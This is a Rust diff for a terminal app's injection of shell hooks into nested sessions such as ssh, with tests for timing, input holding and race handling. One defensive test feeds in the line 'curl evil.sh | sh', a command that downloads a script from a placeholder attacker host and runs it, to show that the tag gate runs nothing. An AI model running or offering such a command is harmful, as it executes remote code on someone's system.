+    /// the user submitted (`answer_from`); in phase 2 the first growth is the
+    /// echo coming back, which is both the proof and the link measurement.
     fn rebase_nesthook(&self, id: Uuid, len: u64, now: Instant) {
-        let mut map = self.nesthooks.lock();
-        let Some(e) = map.get_mut(&id) else { return };
-        match &mut e.phase {
-            Phase::AwaitQuiet { last_len, last_change, .. }
-            | Phase::AwaitEcho { last_len, last_change, .. } => {
-                *last_len = len;
-                *last_change = now;
-            }
-            _ => {}
+        if let Some(e) = self.nesthooks.lock().get_mut(&id) {
+            e.on_growth(len, now);
         }
     }
 
-    /// Phase 1 → 2: type the reader line.
-    fn send_nesthook_reader(&self, id: Uuid, now: Instant) {
-        let reader = {
-            let map = self.nesthooks.lock();
-            let Some(e) = map.get(&id) else { return };
-            e.inj.reader.clone()
-        };
-        if !self.type_reestablish_line(id, &reader) {
+    /// Phase 1 → 2: type the reader line — with the writer held, and only if
+    /// nothing has changed since the pump decided to: no output since the
+    /// journal length `seen` the decision was made on (the screen it judged
+    /// is still the screen), and no input since (a partial line removed the
+    /// entry; a submitted one set `answer_from`). Input takes the same lock
+    /// to decide where it goes, so it cannot slip in between this check and
+    /// the reader's bytes.
+    fn send_nesthook_reader(&self, id: Uuid, seen: u64) {
+        let Some(writer) = self.sessions.lock().get(&id).map(|s| s.writer.clone()) else {
             self.cancel_nesthook(id, "session gone before the hooks could be typed");
             return;
-        }
-        let len = self.journal_len(id).unwrap_or(0);
-        if let Some(e) = self.nesthooks.lock().get_mut(&id) {
+        };
+        let typed = {
+            let mut w = writer.lock();
+            // Measured BEFORE the write: every byte after this is the echo.
+            let len = self.journal_len(id).unwrap_or(seen);
+            let now = Instant::now();
+            let begun = self
+                .nesthooks
+                .lock()
+                .get_mut(&id)
+                .and_then(|e| e.begin_reader(seen, len, now).map(|r| (r, e.depth)));
+            // None: input or output arrived since the decision (or the
+            // injection is gone) — the next tick re-judges.
+            let Some((reader, depth)) = begun else { return };
+            log::info!("terminal {id}: injecting Pulse hooks into the nested shell (depth {depth})");
+            if write_line(&mut **w, &reader) {
+                true
+            } else {
+                self.nesthooks.lock().remove(&id);
+                false
+            }
+        };
+        if !typed {
             log::info!(
-                "terminal {id}: injecting Pulse hooks into the nested shell (depth {})",
-                e.depth
+                "terminal {id}: nested hook injection stopped — the PTY write failed before the hooks could be typed"
             );
-            e.phase = Phase::AwaitEcho { sent: now, last_len: len, last_change: now };
         }
     }
 }
@@ -867,19 +1375,19 @@ mod tests {
     fn open_action_matrix() {
         let ms = Duration::from_millis;
         // (since_armed, quiet_for, credential, hostkey, alt, at_prompt)
-        assert_eq!(open_action(ms(100), ms(100), false, false, false, true), OpenAction::Wait);
-        assert_eq!(open_action(ms(600), ms(699), false, false, false, true), OpenAction::Wait);
-        assert_eq!(open_action(ms(1000), ms(700), false, false, false, true), OpenAction::Send);
+        assert_eq!(open_action(ms(100), ms(100), false, false, false, true, false), OpenAction::Wait);
+        assert_eq!(open_action(ms(600), ms(699), false, false, false, true, false), OpenAction::Wait);
+        assert_eq!(open_action(ms(1000), ms(700), false, false, false, true, false), OpenAction::Send);
         // Credential abort — the reestablish predicate, reused verbatim.
         assert_eq!(
-            open_action(ms(1000), ms(700), true, false, false, true),
+            open_action(ms(1000), ms(700), true, false, false, true, false),
             OpenAction::AbortCredential
         );
         assert!(reestablish::credential_prompt_line("[sudo] password for rig:"));
         // typed-ssh-nested: ssh's host-key question aborts too, and the
         // composer's auth classifier is the ONE definition of that row.
         assert_eq!(
-            open_action(ms(1000), ms(700), false, true, false, true),
+            open_action(ms(1000), ms(700), false, true, false, true, false),
             OpenAction::AbortHostKey
         );
         use crate::gui::composer::{detect_auth_prompt, AuthPrompt};
@@ -900,17 +1408,17 @@ mod tests {
         assert_eq!(detect_auth_prompt("rig@host:~$"), AuthPrompt::None);
         // A credential line outranks the host-key line (both abort anyway).
         assert_eq!(
-            open_action(ms(1000), ms(700), true, true, false, true),
+            open_action(ms(1000), ms(700), true, true, false, true, false),
             OpenAction::AbortCredential
         );
         // Alt-screen outranks both (no prompt exists at all).
-        assert_eq!(open_action(ms(1000), ms(700), true, false, true, true), OpenAction::AbortAlt);
-        assert_eq!(open_action(ms(1000), ms(700), false, true, true, true), OpenAction::AbortAlt);
-        assert_eq!(open_action(ms(1000), ms(700), false, false, true, true), OpenAction::AbortAlt);
+        assert_eq!(open_action(ms(1000), ms(700), true, false, true, true, false), OpenAction::AbortAlt);
+        assert_eq!(open_action(ms(1000), ms(700), false, true, true, true, false), OpenAction::AbortAlt);
+        assert_eq!(open_action(ms(1000), ms(700), false, false, true, true, false), OpenAction::AbortAlt);
         // Settled but NOT at a shell prompt (a wizard/menu/banner): keep
         // watching — never type a line into something that wants keypresses.
         assert_eq!(
-            open_action(ms(1000), ms(700), false, false, false, false),
+            open_action(ms(1000), ms(700), false, false, false, false, false),
             OpenAction::WaitForPrompt
         );
         // ...and the classifier this gate delegates to agrees on the shapes
@@ -926,11 +1434,11 @@ mod tests {
         assert!(!prompt("", 0));
         // Timeout outranks everything, settled or not, prompt or not.
         assert_eq!(
-            open_action(OPEN_TIMEOUT, ms(100), false, false, false, true),
+            open_action(OPEN_TIMEOUT, ms(100), false, false, false, true, false),
             OpenAction::AbortTimeout
         );
         assert_eq!(
-            open_action(OPEN_TIMEOUT + ms(1), ms(900), true, true, true, false),
+            open_action(OPEN_TIMEOUT + ms(1), ms(900), true, true, true, false, false),
             OpenAction::AbortTimeout
         );
     }
@@ -1023,10 +1531,15 @@ mod tests {
         assert_eq!(erase_start_row(&wide, 99, &inj.reader), None);
         assert_eq!(erase_start_row(&wide, 1, "   "), None);
 
-        // ...and the payload the gate feeds: a row becomes an absolute CUP +
-        // erase-to-end-of-display, no row becomes an EMPTY blob (eval "").
-        assert!(!bootstrap::nested_erase_payload(Some(7)).is_empty());
-        assert!(bootstrap::nested_erase_payload(None).is_empty());
+        // ...and the payload line the gate feeds: a row the shell formats
+        // itself, no row an empty one (nothing is erased).
+        let row = |r| {
+            let mut i = inj.clone();
+            i.erase_row = r;
+            i.payload_lines()[3].clone()
+        };
+        assert_eq!(row(Some(7)), format!("{}7", bootstrap::NESTED_TAGS[3]));
+        assert_eq!(row(None), bootstrap::NESTED_TAGS[3]);
     }
 
     /// User input during phase 1: a SUBMITTED line keeps the injection
@@ -1051,31 +1564,275 @@ mod tests {
         assert_eq!(growth_action(OPEN_TIMEOUT + ms(5000)), OpenAction::AbortTimeout);
         // Phase 2's companion: the payload deadline fires while output
         // streams, so a shell parked in our `read` is never left waiting.
-        assert!(!echo_ready(ECHO_DEADLINE - ms(1), Duration::ZERO));
-        assert!(echo_ready(ECHO_DEADLINE, Duration::ZERO));
+        for rtt in [None, Some(ms(300))] {
+            assert!(!echo_ready(ECHO_DEADLINE_MIN - ms(1), Duration::ZERO, rtt, false));
+            assert!(echo_ready(ECHO_DEADLINE_MIN, Duration::ZERO, rtt, false));
+        }
+        let t0 = Instant::now();
+        let mut e = in_reads(t0);
+        e.on_growth(200, t0 + ms(100));
+        assert!(!e.echo_overdue(t0 + ECHO_DEADLINE_MIN - ms(1)));
+        assert!(e.echo_overdue(t0 + ECHO_DEADLINE_MIN), "a growth tick still enforces the deadline");
     }
 
+    /// A fresh entry for `inj`, armed at `t0` with the journal at 100.
+    fn armed(t0: Instant) -> NestHook {
+        NestHook::new(1, bootstrap::nested_injection("cafebabe12345678"), "ssh host", 100, t0)
+    }
+
+    /// An entry whose reader was typed at `t0` (journal at 100).
+    fn in_reads(t0: Instant) -> NestHook {
+        let mut e = armed(t0);
+        assert!(e.begin_reader(100, 100, t0).is_some());
+        e
+    }
+
+    /// DEFECT 1 (field: `wan600-02`, rig-reproduced at 600ms RTT). The
+    /// payload must wait for PROOF — the reader's echo coming back — and
+    /// silence before that proves nothing. v0.1.14-21 fired on 250ms of
+    /// silence: at 600ms RTT that is before the reader has even reached the
+    /// far end, so the mirror could not vouch for the line (it stayed on
+    /// screen) and on a loaded host the payload was echoed too.
     #[test]
-    fn input_gating() {
-        assert!(input_keeps_waiting(true), "a submitted line must not abandon");
-        assert!(
-            !input_keeps_waiting(false),
+    fn a_slow_link_waits_for_the_echo_before_the_payload() {
+        let ms = Duration::from_millis;
+        let t0 = Instant::now();
+        let mut e = in_reads(t0);
+        // 600ms RTT: nothing comes back for 600ms. Every tick in that window
+        // must wait, however quiet — the old rule fired on the first one.
+        for t in [250, 500, 599] {
+            assert_eq!(e.echo_due(t0 + ms(t), || true), None, "fired blind at {t}ms");
+        }
+        // The echo lands: that is the proof AND the link measurement.
+        e.on_growth(450, t0 + ms(600));
+        assert!(matches!(e.phase, Phase::AwaitEcho { rtt: Some(r), .. } if r == ms(600)));
+        // ...and it must settle before the payload goes.
+        assert_eq!(e.echo_due(t0 + ms(600) + ECHO_QUIET - ms(1), || true), None);
+        assert_eq!(
+            e.echo_due(t0 + ms(600) + ECHO_QUIET, || true),
+            Some("the reader's echo came back and settled")
+        );
+        // The deadline grew with the link: 8 round trips, clamped.
+        assert_eq!(echo_deadline(None), ECHO_DEADLINE_MIN, "nothing gets shorter");
+        assert_eq!(echo_deadline(Some(ms(600))), ECHO_DEADLINE_MIN);
+        assert_eq!(echo_deadline(Some(ms(1500))), ms(12000));
+        assert_eq!(echo_deadline(Some(Duration::from_secs(60))), ECHO_DEADLINE_MAX);
+    }
+
+    /// The echo came back but the mirror does not vouch for it (a redrawn or
+    /// scrolled line): the shell still demonstrably has the line, so the
+    /// payload goes after a longer settle — never before the echo, and never
+    /// later than the deadline. No echo at all: the deadline, and only it.
+    #[test]
+    fn an_unvouched_echo_settles_longer_and_no_echo_waits_for_the_deadline() {
+        let ms = Duration::from_millis;
+        let t0 = Instant::now();
+        let mut e = in_reads(t0);
+        e.on_growth(450, t0 + ms(100));
+        assert_eq!(e.echo_due(t0 + ms(100) + ECHO_QUIET, || false), None);
+        assert_eq!(e.echo_due(t0 + ms(100) + ECHO_QUIET_UNVOUCHED - ms(1), || false), None);
+        assert_eq!(
+            e.echo_due(t0 + ms(100) + ECHO_QUIET_UNVOUCHED, || false),
+            Some("the reader's echo came back (the mirror does not vouch for it)")
+        );
+        // A slow link's unvouched settle is at least one measured round trip.
+        let mut slow = in_reads(t0);
+        slow.on_growth(450, t0 + ms(1500));
+        assert_eq!(slow.echo_due(t0 + ms(1500) + ECHO_QUIET_UNVOUCHED, || false), None);
+        assert!(slow.echo_due(t0 + ms(3000), || false).is_some());
+        // Never an echo: only the deadline releases the shell from `read`.
+        let silent = in_reads(t0);
+        assert_eq!(silent.echo_due(t0 + ECHO_DEADLINE_MIN - ms(1), || true), None);
+        assert_eq!(
+            silent.echo_due(t0 + ECHO_DEADLINE_MIN, || true),
+            Some("no echo came back by the deadline")
+        );
+        // The mirror is not even asked before the echo has been seen.
+        let unasked = in_reads(t0);
+        assert_eq!(unasked.echo_due(t0 + ms(400), || panic!("asked the mirror blind")), None);
+    }
+
+    /// The input router: phase 1 submitted ⇒ deliver and await the answer;
+    /// phase 1 partial ⇒ abandon; phase 2 ⇒ hold (up to the cap).
+    #[test]
+    fn input_route_table() {
+        use InputRoute::*;
+        use InputWindow::*;
+        for submitted in [false, true] {
+            assert_eq!(input_route(Open, submitted, 10), Deliver);
+            assert_eq!(input_route(InReads, submitted, 10), Hold);
+            assert_eq!(input_route(InReads, submitted, HOLD_CAP), Hold);
+            assert_eq!(input_route(InReads, submitted, HOLD_CAP + 1), FlushThenDeliver);
+        }
+        assert_eq!(input_route(BeforeReader, true, 10), DeliverAwaitAnswer);
+        assert_eq!(
+            input_route(BeforeReader, false, 10),
+            DeliverAbandon,
             "half-typed input must abandon — never concatenate onto the user's line"
         );
     }
 
-    /// Phase 2: the payload goes out on a settled echo, and UNCONDITIONALLY
-    /// at the deadline — a shell parked in our `read` is never left waiting.
+    /// What the remote shell does with a byte stream that starts with our
+    /// reader line, following `NESTED_READER` (whose text the bootstrap
+    /// goldens pin): the lines its `read`s consume, the body string it
+    /// evaluates, and what is left for the shell's next prompt.
+    fn remote_reads(stream: &str) -> (Vec<String>, String, String) {
+        let tags = bootstrap::NESTED_TAGS;
+        let reader = bootstrap::nested_injection("cafebabe12345678").reader;
+        let rest = stream.strip_prefix(&format!("{reader}\r")).expect("the reader goes first");
+        let mut lines = rest.splitn(5, '\r').map(str::to_string);
+        let mut read = vec![lines.next().unwrap_or_default()];
+        if read[0].starts_with(tags[0]) {
+            read.extend((0..3).map(|_| lines.next().unwrap_or_default()));
+        }
+        let ours = read.len() == 4 && read.iter().zip(tags).all(|(l, t)| l.starts_with(t));
+        let body = if ours {
+            format!("{}{}", &read[0][tags[0].len()..], &read[1][tags[1].len()..])
+        } else {
+            String::new()
+        };
+        let left = rest.splitn(read.len() + 1, '\r').nth(read.len()).unwrap_or("").to_string();
+        (read, body, left)
+    }
+
+    /// DEFECT 2. Input typed while the shell is parked in the injection's
+    /// reads is HELD and written after the payload, so the reads consume only
+    /// Pulse's lines and the user's command reaches the shell intact,
+    /// afterwards. The stream below is built the way `Core` writes it: input
+    /// the router says to deliver is written at once (between the reader and
+    /// the payload, if that is when it arrived); held input after the payload.
+    /// Delivering it at once — the race v0.1.14-21 left open between its
+    /// notification and its write — puts the user's line into `read`, shifts
+    /// the payload, and (before the tag gate) evaluated the result.
     #[test]
-    fn echo_ready_matrix() {
+    fn input_during_the_reads_is_held_and_follows_the_payload() {
         let ms = Duration::from_millis;
-        assert!(!echo_ready(ms(100), ms(0)));
-        assert!(!echo_ready(ms(100), ECHO_QUIET - ms(1)));
-        assert!(echo_ready(ms(300), ECHO_QUIET));
-        assert!(
-            echo_ready(ECHO_DEADLINE, Duration::ZERO),
-            "the deadline must fire even while output is still streaming"
+        let t0 = Instant::now();
+        let mut e = armed(t0);
+        let reader = e.begin_reader(100, 100, t0).expect("typed");
+        let mut stream = format!("{reader}\r");
+        let typed: [&[u8]; 3] = [b"echo TYPED_$((6*7))\r", b"ls -la", b"\r"];
+        for (i, bytes) in typed.iter().enumerate() {
+            let submitted = bytes.last() == Some(&b'\r');
+            match e.route_input(bytes, submitted, Some(100), t0 + ms(10 * i as u64)) {
+                InputRoute::Hold => {}
+                InputRoute::Deliver | InputRoute::DeliverAwaitAnswer => {
+                    stream.push_str(std::str::from_utf8(bytes).unwrap())
+                }
+                other => panic!("unexpected route {other:?}"),
+            }
+        }
+        e.on_growth(450, t0 + ms(600));
+        assert!(e.echo_due(t0 + ms(900), || true).is_some());
+        let (lines, held) = e.take_payload(Some(12), t0 + ms(900)).expect("payload");
+        for l in &lines {
+            stream.push_str(l);
+            stream.push('\r');
+        }
+        stream.push_str(std::str::from_utf8(&held).unwrap());
+
+        let (read, body, left) = remote_reads(&stream);
+        assert_eq!(read, lines.to_vec(), "the reads must consume exactly Pulse's four lines");
+        assert_eq!(body, e.inj.bash_b64, "the evaluated body must be Pulse's own");
+        assert_eq!(
+            left, "echo TYPED_$((6*7))\rls -la\r",
+            "the user's input must reach the shell intact, in order, after the payload"
         );
+        assert!(matches!(e.phase, Phase::AwaitInit { .. }));
+        // Once the payload is out, input flows straight through.
+        assert_eq!(e.route_input(b"x", false, Some(500), t0 + ms(950)), InputRoute::Deliver);
+    }
+
+    /// The tag gate, on the stream a desync produces (a user line between the
+    /// reader and the payload): the reader stops at the foreign line, reads
+    /// no more, and evaluates NOTHING — the old reader evaluated the shifted
+    /// lines, the user's line among them.
+    #[test]
+    fn a_desynced_stream_evaluates_nothing() {
+        let mut inj = bootstrap::nested_injection("cafebabe12345678");
+        inj.erase_row = Some(3);
+        let mut stream = format!("{}\rcurl evil.sh | sh\r", inj.reader);
+        for l in inj.payload_lines() {
+            stream.push_str(&l);
+            stream.push('\r');
+        }
+        let (read, body, left) = remote_reads(&stream);
+        assert_eq!(read, vec!["curl evil.sh | sh".to_string()], "one read, then stop");
+        assert_eq!(body, "", "nothing may be evaluated");
+        // What is left runs at the prompt: our four lines, each an inert
+        // ` #`-led comment.
+        for l in left.split('\r').filter(|l| !l.is_empty()) {
+            assert!(l.starts_with(" #p"), "{l:?} would run as a command");
+        }
+    }
+
+    /// The H3 analogue (rig-reproduced at 600ms RTT: `cat > notes` written
+    /// Pulse's reader and its 7KB payload into the user's file). A line the
+    /// user submits at the nested prompt leaves the OLD prompt on screen for
+    /// a whole round trip; nothing on the screen is evidence until the shell
+    /// has answered.
+    #[test]
+    fn a_submit_at_the_nested_prompt_waits_for_the_shells_answer() {
+        let ms = Duration::from_millis;
+        let t0 = Instant::now();
+        let mut e = armed(t0);
+        // The nested prompt painted and settled.
+        e.on_growth(300, t0 + ms(100));
+        // The user submits `cat > notes` at 400ms; the journal is at 300.
+        assert_eq!(
+            e.route_input(b"cat > notes\r", true, Some(300), t0 + ms(400)),
+            InputRoute::DeliverAwaitAnswer
+        );
+        let pending = |e: &NestHook| matches!(e.phase, Phase::AwaitQuiet { answer_from: Some(_), .. });
+        assert!(pending(&e));
+        // 1s RTT: at 1.2s the screen is still the quiet old prompt (800ms of
+        // silence since the submit). It must not be read as a place to type.
+        let Phase::AwaitQuiet { armed: armed_at, last_change, answer_from, .. } = e.phase else {
+            unreachable!()
+        };
+        let at = t0 + ms(1200);
+        assert_eq!(
+            open_action(at - armed_at, at - last_change, false, false, false, true, answer_from.is_some()),
+            OpenAction::Wait,
+            "the reader must not be typed before the shell answered the user's line"
+        );
+        // ...nor may the reader be typed by a decision already in flight.
+        assert_eq!(e.clone().begin_reader(300, 300, at), None);
+        // The echo of the user's line arrives: the shell answered. From here
+        // the ordinary settle rules judge the screen it painted.
+        e.on_growth(330, t0 + ms(1400));
+        assert!(!pending(&e));
+        // Growth that is not past the submit point does not count.
+        let mut early = armed(t0);
+        early.route_input(b"cat\r", true, Some(300), t0 + ms(400));
+        early.on_growth(300, t0 + ms(450));
+        assert!(pending(&early), "only output after the submit is an answer");
+    }
+
+    /// The reader is typed only on the screen the pump judged: output since
+    /// the decision, or an unanswered submit, refuses it.
+    #[test]
+    fn the_reader_is_typed_only_on_the_screen_that_was_judged() {
+        let t0 = Instant::now();
+        assert_eq!(armed(t0).begin_reader(100, 101, t0), None, "output arrived since");
+        let mut e = armed(t0);
+        assert!(e.begin_reader(100, 100, t0).is_some());
+        assert_eq!(e.begin_reader(100, 100, t0), None, "never twice");
+    }
+
+    /// The hold is bounded: past `HOLD_CAP` the payload goes now and the
+    /// held bytes follow it — nothing is ever dropped.
+    #[test]
+    fn a_huge_paste_during_the_reads_flushes_rather_than_drops() {
+        let t0 = Instant::now();
+        let mut e = in_reads(t0);
+        let chunk = vec![b'a'; HOLD_CAP / 2];
+        assert_eq!(e.route_input(&chunk, false, None, t0), InputRoute::Hold);
+        assert_eq!(e.route_input(&chunk, false, None, t0), InputRoute::Hold);
+        assert_eq!(e.route_input(b"b", false, None, t0), InputRoute::FlushThenDeliver);
+        let (_, held) = e.take_payload(None, t0).expect("payload");
+        assert_eq!(held.len(), HOLD_CAP, "everything held so far follows the payload");
+        assert_eq!(e.take_payload(None, t0), None, "the payload goes out once");
     }
 
     /// The resume-sequencing contract: `reestablish` may only type the
